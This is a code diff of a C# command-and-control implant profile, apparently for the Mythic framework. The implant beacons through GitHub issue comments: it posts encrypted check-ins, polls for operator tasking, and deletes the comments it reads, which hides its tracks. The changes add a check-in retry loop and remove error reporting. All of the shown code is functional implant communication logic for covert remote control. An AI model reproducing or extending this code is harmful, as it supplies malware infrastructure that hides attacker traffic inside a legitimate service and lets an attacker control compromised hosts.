@@ -47,8 +47,8 @@ namespace Agent.Profiles
         public async Task<CheckinResponse> Checkin(Checkin checkin)
         {
             // Post Checkin Message
-            //Console.WriteLIne("Start checkin");
-            //Console.WriteLIne(agentConfig.uuid);
+            //Console.WriteLine("Start checkin");
+            //Console.WriteLine(agentConfig.uuid);
 
             var json = this.crypt.Encrypt(JsonSerializer.Serialize(checkin, CheckinJsonContext.Default.Checkin));
             string url = $"{URL}/{CLIENT_ISSUE}/comments";
@@ -58,51 +58,60 @@ namespace Agent.Profiles
             var response = await client.PostAsync(url, content);
             if (response.IsSuccessStatusCode)
             {
-                //Console.WriteLIne("Comment successfully created.");
+                //Console.WriteLine("Comment successfully created.");
             }
             else
             {
-                //Console.WriteLIne($"Failed to create comment. Status code: {response.StatusCode}");
-                //Console.WriteLIne($"Response: {await response.Content.ReadAsStringAsync()}");
+                //Console.WriteLine($"Failed to create comment. Status code: {response.StatusCode}");
+                //Console.WriteLine($"Response: {await response.Content.ReadAsStringAsync()}");
             }
 
-            // Wait 3 seconds for Mythic to post a checkin response 
-            // to GitHub for the agent to retrieve 
-            await Task.Delay(3000);
-
-            // Get checkin response
-            var comments = await GetComments(SERVER_ISSUE);
-            foreach (var comment in comments)
+            int maxAttempts = 3;
+            int currentAttempt = 0;
+            do
             {
-                var message = Encoding.UTF8.GetString(Convert.FromBase64String(comment.body));
-                var payloadUuid = message.Substring(0, 36);
-                var mythMsg = JsonSerializer.Deserialize<Dictionary<string, string>>(message.Substring(36));
+                // Relax.. wait for Mythic to post a checkin response 
+                // to GitHub for the agent to retrieve 
+                await Task.Delay(3000);
 
-                if (payloadUuid == agentConfig.uuid)
+                // Get checkin response
+                var comments = await GetComments(SERVER_ISSUE);
+                foreach (var comment in comments)
                 {
-                    if (payloadUuid != mythMsg["id"])
+                    var message = Encoding.UTF8.GetString(Convert.FromBase64String(comment.body));
+                    var payloadUuid = message.Substring(0, 36);
+                    var mythMsg = JsonSerializer.Deserialize<Dictionary<string, string>>(message.Substring(36));
+
+                    if (payloadUuid == agentConfig.uuid)
                     {
-                        //Console.WriteLIne($"Updating new UUID to: {mythMsg["id"]}");
-                        this.cir = JsonSerializer.Deserialize<CheckinResponse>(message.Substring(36));
-                        this.checkedin = true;
-                        await DeleteComment(comment.id);
-                        return this.cir;
+                        if (mythMsg["action"] == "checkin" && payloadUuid != mythMsg["id"])
+                        {
+                            //Console.WriteLine($"Updating new UUID to: {mythMsg["id"]}");
+                            this.cir = JsonSerializer.Deserialize<CheckinResponse>(message.Substring(36));
+                            this.checkedin = true;
+                            await DeleteComment(comment.id);
+                            return this.cir;
+                        }
                     }
                 }
-            }
+                currentAttempt++;
+            } while (currentAttempt <= maxAttempts);
             
-            return this.cir;
+            return new CheckinResponse()
+            {
+                status = "failed"
+            };
         }
 
         public async Task StartBeacon()
         {
             //Main beacon loop handled here
-            //Console.WriteLIne(agentConfig.uuid);
+            //Console.WriteLine(agentConfig.uuid);
             this.cancellationTokenSource = new CancellationTokenSource();
             List<(string id, string body)> comments = new List<(string id, string body)>();
             while (!cancellationTokenSource.Token.IsCancellationRequested)
             {
-                //Console.WriteLIne("Checking In");
+                //Console.WriteLine("Checking In");
                 // Check if we have responses to send
                 if (this.messageManager.HasResponses())
                 {
@@ -118,7 +127,7 @@ namespace Agent.Profiles
                         var payloadUuid = m.Substring(0, 36);
                         if (payloadUuid == agentConfig.uuid)
                         {
-                            //Console.WriteLIne("New Task received!");
+                            //Console.WriteLine("New Task received!");
                             GetTaskingResponse gtr = JsonSerializer.Deserialize<GetTaskingResponse>(m.Substring(36));
                             TaskingReceivedArgs tra = new TaskingReceivedArgs(gtr);
                             this.SetTaskingReceived(this, tra);
@@ -162,37 +171,18 @@ namespace Agent.Profiles
 
         private async Task PostComment(string json)
         {
-            //Console.WriteLIne(json);
+            //Console.WriteLine(json);
             string msg = this.crypt.Encrypt(json);
             var url = $"{URL}/{CLIENT_ISSUE}/comments";
             var payload = new { body = msg };
             var content = new StringContent(JsonSerializer.Serialize(payload), Encoding.UTF8, "application/json");
-
-            var response = await client.PostAsync(url, content);
-            if (response.IsSuccessStatusCode)
-            {
-                //Console.WriteLIne("Comment successfully created.");
-            }
-            else
-            {
-                //Console.WriteLIne($"Failed to create comment. Status code: {response.StatusCode}");
-                //Console.WriteLIne($"Response: {await response.Content.ReadAsStringAsync()}");
-            }
+            await client.PostAsync(url, content);
         }
 
         static async Task DeleteComment(string commentId)
         {
             var url = $"{URL}/comments/{commentId}";
-            HttpResponseMessage response = await client.DeleteAsync(url);
-            if (response.IsSuccessStatusCode)
-            {
-                //Console.WriteLIne($"Comment {commentId} successfully deleted.\n");
-            }
-            else
-            {
-                //Console.WriteLIne($"Failed to delete comment {commentId}. Status code: {response.StatusCode}");
-                //Console.WriteLIne($"Response: {await response.Content.ReadAsStringAsync()}");
-            }
+            await client.DeleteAsync(url);
         }
     }
 }
